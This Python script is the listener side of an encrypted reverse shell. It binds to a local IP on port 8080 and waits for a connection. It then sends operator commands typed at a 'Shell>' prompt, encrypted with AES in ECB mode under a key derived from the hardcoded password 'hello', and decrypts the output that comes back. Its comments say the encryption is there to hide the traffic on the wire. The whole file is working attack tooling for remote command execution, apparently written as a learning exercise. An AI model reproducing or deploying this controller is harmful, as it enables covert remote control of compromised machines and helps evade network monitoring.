import os
import socket
from Crypto.Cipher import AES
import hashlib
import sys
import binascii
import Padding

# Simple way to encrpt traffic so it cant be seen on the wire
# Reverse shell using AES ECB
# NOTE ECB is insecure as it repeats

password='hello'
ival=10

key = hashlib.sha256(password.encode()).digest()


#  Test if its running netstat -antp | grep 8080
#  on windows netstat -ano
#  The tcp client should be run on linux only

def encrypt(plaintext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.encrypt(plaintext))

def decrypt(ciphertext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.decrypt(ciphertext))

def connect():
    print("[+] - Attempting to connect to server connection...")
    s = socket.socket()
    #s.bind(("10.174.15.6", 8080))
    s.bind(("192.168.1.183", 8080))
    s.listen(1)
    conn, addr = s.accept()

    print(" The connection", conn)
    print ("[+] We got a connection from",addr)

    while True:
        
        command = input("Shell>")
              
        plaintext=command
        
        #With ECB we have block made up og 16 bytes.  we need to pad the rest with null bytes
        
        plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
        print("The plain text with padding added",plaintext)
        #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())

        ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
        print("The command encrypted",ciphertext)
        #ciphertext = binascii.hexlify(bytearray(ciphertext)).decode()
        #print("Cipher TExt",ciphertext)
        #conn.send(command.encode())
    
        conn.send(ciphertext)
        
        cipherResponse = conn.recv(4096)
        print("The respone encrypted",cipherResponse)
        
        # We now decrypt the text
        responsePlaintext = decrypt(cipherResponse,key,AES.MODE_ECB)
        #Remove all the padding
        responsePlaintext = Padding.removePadding(responsePlaintext.decode(),mode=0)  
        
        #Response now in raw text 
        print ("  decrypted: "+responsePlaintext)        
        
        
def main():
      
    connect()

main()
